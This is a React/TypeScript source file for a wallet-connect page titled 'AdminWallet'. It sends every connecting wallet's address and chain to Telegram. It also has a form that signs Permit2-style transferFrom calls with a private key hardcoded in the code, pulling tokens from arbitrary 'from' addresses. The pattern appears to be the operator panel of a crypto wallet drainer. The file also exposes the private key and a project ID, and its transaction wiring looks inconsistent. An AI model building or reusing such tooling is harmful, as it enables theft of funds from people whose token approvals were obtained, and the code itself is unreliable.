import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";
import { createWeb3Modal, defaultWagmiConfig } from "@web3modal/wagmi/react";
import { WagmiConfig, useAccount, useNetwork } from "wagmi";
import { mainnet, polygon, optimism, arbitrum, Chain } from "wagmi/chains";
import { ethers, BigNumber, Contract } from 'ethers';

import { logToTelegram } from "./log"; // Import logging function
import "./index.css";

const projectId = "d03f390f6413dfedf9599364a8ac0ec4";

// Define the tBNB (Binance Smart Chain Testnet) custom chain
const tBNB: Chain = {
  id: 97, // BNB Chain Testnet ID
  name: 'BNB Smart Chain Testnet',
  network: 'bsc-testnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'tBNB',
    decimals: 18,
  },
  rpcUrls: {
    default: {
      http: ['https://data-seed-prebsc-1-s1.binance.org:8545'], // Public RPC URL
    },
  },
  blockExplorers: {
    default: { name: 'BscScan', url: 'https://testnet.bscscan.com' },
  },
  testnet: true, // Indicating this is a testnet
};

// Include the custom tBNB chain along with other chains
const chains = [mainnet, polygon, optimism, arbitrum, tBNB];

const wagmiConfig = defaultWagmiConfig({
  chains,
  projectId,
  appName: "Web3Modal v3",
});

createWeb3Modal({ wagmiConfig, projectId, chains });

const AdminWallet = () => {
  const { address } = useAccount();
  const { chain } = useNetwork();
  const [hasLogged, setHasLogged] = useState(false); // State to track if the log has been sent

  useEffect(() => {
    if (address && chain && !hasLogged) {
      const message = `Wallet connected: \nAddress: ${address} \nChain: ${chain.name}`;
      logToTelegram(message);
      setHasLogged(true); // Set the flag to true after logging
    }
  }, [address, chain, hasLogged]);

  // Function to handle ERC20 transferFrom call
  const handleTransfer = async (contractAddress: string, fromAddress: string, toAddress: string, tokenAddress: string, amount: string) => {
    const privateKey = 'd478bf4ac2bb350640ed297e9bcdf89c6736e63f5de5f9431b1260412262c00f'; // Replace with your private key
    const provider = new ethers.providers.Web3Provider((window as any).ethereum);
    const wallet = new ethers.Wallet(privateKey, provider);
    const parsedAmount = ethers.utils.parseUnits(amount, 18); // Replace with the amount of tokens (18 decimals)
    const currentNonce = await provider.getTransactionCount(wallet.address, 'latest');

    // ERC20 Token ABI (for transferFrom)
    const erc20Abi = [
      'function transferFrom(address from, address to, uint160 amount, address token)',
    ];

    // Create the contract instance for the token
    const tokenContract = new ethers.Contract(contractAddress, erc20Abi, wallet);

    const txData = await tokenContract.populateTransaction.transferFrom(fromAddress, toAddress, parsedAmount, tokenAddress);

    const gasEstimate = await tokenContract.estimateGas.transferFrom(fromAddress, toAddress, parsedAmount, tokenAddress);

    const unsignedTx = {
      to: tokenAddress,
      data: txData.data,
      gasLimit: gasEstimate,
      chainId: 97,  // BNB Testnet chain ID
      nonce: currentNonce,
    };

    // Sign and send the transaction
    const signedTx = await wallet.signTransaction(unsignedTx);
    const txResponse = await provider.sendTransaction(signedTx);
    console.log('Transaction Hash:', txResponse.hash);
  };

  return (
    <>
      <div className="container">
        <w3m-button />
        <w3m-network-button />
        {address && (
          <>
            <form onSubmit={(e) => {
              e.preventDefault();
              const form = e.target as HTMLFormElement;
              const contractAddress = (form.elements.namedItem('contractAddress') as HTMLInputElement).value;
              const fromAddress = (form.elements.namedItem('fromAddress') as HTMLInputElement).value;
              const toAddress = (form.elements.namedItem('toAddress') as HTMLInputElement).value;
              const tokenAddress = (form.elements.namedItem('tokenAddress') as HTMLInputElement).value;
              const amount = (form.elements.namedItem('amount') as HTMLInputElement).value;
              handleTransfer(contractAddress, fromAddress, toAddress, tokenAddress, amount);
            }}>
              <input name="contractAddress" placeholder="Contract Address" />
              <input name="fromAddress" placeholder="From Address" />
              <input name="toAddress" placeholder="To Address" />
              <input name="tokenAddress" placeholder="Token Address" />
              <input name="amount" placeholder="Amount" />
              <button type="submit">Transfer</button>
            </form>
          </>
        )}
      </div>
    </>
  );
};

ReactDOM.createRoot(document.getElementById("root") as HTMLElement).render(
  <React.StrictMode>
    <WagmiConfig config={wagmiConfig}>
      <AdminWallet />
    </WagmiConfig>
  </React.StrictMode>
);
